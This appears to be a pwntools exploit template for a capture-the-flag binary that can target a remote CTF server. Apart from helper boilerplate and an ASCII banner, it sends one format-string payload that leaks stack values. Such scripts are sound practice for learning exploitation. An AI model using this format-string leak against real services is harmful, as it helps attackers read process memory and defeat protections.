from pwn import *

context.log_level = 'debug'
exe = './chall'
elf = ELF('./chall')
context.binary = elf

#libc = ELF('libc')
#ld = ELF('ld')

def start(argv=[], *a, **kw):
    if(sys.argv[1] == "d"):
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif(sys.argv[1] == "r"):
        return remote("tjc.tf", 31258)
    elif(sys.argv[1] == "l"):
        return process([exe] + argv, *a, **kw)

def s(a) : return io.send(a)
def sl(a) : return io.sendline(a)
def sa(a,b) : return io.sendafter(a,b)
def sla(a,b) : return io.sendlineafter(a,b)
def r(a) : return io.recv(a)
def ru(a) : return io.recvuntil(a)
def ra(a) : return io.recvall(a)
def rl() : return io.recvline()
def interactive() : return io.interactive()
def cls() : return io.close()
def p(a) : return log.info(a)
def suck(a) : return log.success(a)

gdbscript = '''
b main
c
'''.format(**locals())

#==========================================================
'''
 _   _                 _    _        _____                   
| | | |               | |  | |      |  __ \                  
| |_| | ___ _ __ ___  | |  | | ___  | |  \/ ___              
|  _  |/ _ \ '__/ _ \ | |/\| |/ _ \ | | __ / _ \             
| | | |  __/ | |  __/ \  /\  /  __/ | |_\ \ (_) |  _   _   _ 
\_| |_/\___|_|  \___|  \/  \/ \___|  \____/\___/  (_) (_) (_)
                                                             
'''                                                                                                                                                                                             
#==========================================================


io = start()


sl("%20$p.%21$p.%22$p.%23$p.%24$p.%25$p")


interactive()
